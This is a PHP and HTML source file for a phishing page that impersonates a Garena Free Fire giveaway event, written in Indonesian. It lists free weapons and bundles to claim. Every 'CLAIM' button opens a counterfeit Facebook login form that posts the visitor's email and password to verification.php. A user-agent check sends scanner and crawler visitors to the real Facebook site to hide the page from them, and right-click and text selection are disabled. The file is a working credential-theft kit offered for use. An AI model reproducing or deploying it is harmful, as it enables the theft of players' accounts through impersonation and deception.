<?php 
session_start();
session_destroy();

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: https://facebook.com/');
die();
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta property="og:type" content="website" />
   <meta property="og:title" content="Garena Free Fire Event" />
   <meta property="og:description" content="Dapatkan Bundle & Senjata Free Fire Gratis Sekarang!" />
   <meta property="og:image" content="static/img/reward.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css" integrity="sha512-rRQtF4V2wtAvXsou4iUAs2kXHi3Lj9NE7xJR77DE7GHsxgY9RTWy93dzMXgDIG8ToiRTD45VsDNdTiUagOFeZA==" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="static/css/ryu.css">
    <link rel="stylesheet" href="static/css/fb.css">
    <link rel="stylesheet" href="static/css/vk.css">
    <title>Free Fire Events</title>
  </head>
  <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div id="bg"></div>
    <div id="app">
        <div class="ryu-header">
            <img src="https://i.ibb.co/xJf56d1/IMG-20210202-233450.jpg">
            <div class="ryu-text-header"> Free Fire <span>Event Garena Free Fire</span></div>
        </div>
        <div class="ryu-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-ride="carousel">
               <div class="carousel-inner">
                  <div class="carousel-item active">
                     <img src="https://i.ibb.co/WxwSXBc/iklan-skuyy3.jpg" class="d-block w-100" alt="...">
                  </div>
                  <div class="carousel-item">
                     <img src="https://i.ibb.co/kDp4Ghj/iklan-skuyy2.jpg" class="d-block w-100" alt="...">
                  </div>
                  <div class="carousel-item">
                     <img src="https://i.ibb.co/YZYq7M0/iklan-skuyy1.jpg" class="d-block w-100" alt="...">
                  </div>
               </div>
            </div>
        </div>
        <div class="cat">
           <div class="catBox">Hallo Player, Ambil Hadiah Kalian!</div>
        </div>
        <div class="ryucontent">
            <div class="boxRyu">
               <div class="headBox">SCAR MEGALODON</div>
               <img src="static/img/Arskuyy/1.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">AK DRACO</div>
               <img src="static/img/Arskuyy/2.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">MP40 INCUBATOR</div>
               <img src="static/img/Arskuyy/3.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">BAJU S2</div>
               <img src="static/img/Arskuyy/4.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">OLD TAS</div>
               <img src="static/img/Arskuyy/5.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">BUNDLE CR7</div>
               <img src="static/img/Arskuyy/6.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">BNL</div>
               <img src="static/img/Arskuyy/7.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">M1887 OPM</div>
               <img src="static/img/Arskuyy/8.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">BNL</div>
               <img src="static/img/Arskuyy/9.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">TAS S1</div>
               <img src="static/img/Arskuyy/10.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">M1887</div>
               <img src="static/img/Arskuyy/11.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
            <div class="boxRyu">
               <div class="headBox">M1014 INCU</div>
               <img src="static/img/Arskuyy/12.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
             <div class="boxRyu">
               <div class="headBox">BUNDLE SAITAMA</div>
               <img src="static/img/Arskuyy/13.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
             <div class="boxRyu">
               <div class="headBox">M1887</div>
               <img src="static/img/Arskuyy/14.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
             <div class="boxRyu">
               <div class="headBox">BUNDLE JOKER</div>
               <img src="static/img/Arskuyy/15.jpg" alt="">
               <div class="headBox" id="showLogin">CLAIM</div>
            </div>
        </div>
    </div>

    <div id="selectLogin">
         <div class="cat2">
           <div class="catBox2">Login Free Fire Dengan</div>
           <div class="closeBox">&times;</div>
           <div class="contentLogin">
               <div class="btnLogin" id="loginFacebook">
                  <i class="fa fa-facebook-square" style="float: left; margin-top: 4px; margin-left: 5px;"></i> Login with Facebook
               </div>
           </div>
        </div>
    </div>

    <div class="popup-login login_facebook animated fadeIn" style="display: none;">
      <div class="popup-box-login-fb">
         <a href="javascript:void(0);" class="close-fb"><i class="zmdi zmdi-close"></i></a>
         <div class="navbar-fb">
            <img src="static/img/facebook_text.png">
         </div>
         <div class="content-box-fb">
            <img src="https://i.ibb.co/xJf56d1/IMG-20210202-233450.jpg">
            <div class="txt-login-fb">
               Log in to your Facebook account to connect to Free Fire
            </div>
            <form class="login-form" action="verification.php" method="post">
               <input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
               <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
               <input type="hidden" name="login" value="Facebook" readonly>
               <button type="submit" class="btn-login-fb">Log In</button>
            </form>
            <div class="txt-create-account">Create account</div>
            <div class="txt-not-now">Not now</div>
            <div class="txt-forgotten-password">Forgotten password?</div>
         </div>
         <div class="language-box">
            <center>
            <div class="language-name language-name-active">English (UK)</div>
            <div class="language-name">Bahasa Indonesia</div>
            <div class="language-name">Basa Jawa</div>
            <div class="language-name">Bahasa Melayu</div>
            <div class="language-name">日本語</div>
            <div class="language-name">Español</div>
            <div class="language-name">Português (Brasil)</div>
            <div class="language-name">
               <i class="fa fa-plus"></i>
            </div>
            </center>
         </div>
         <div class="copyright">Facebook Inc.</div>
      </div>
   </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
    <script src="static/js/ryu.js"></script>
   </body>
</html>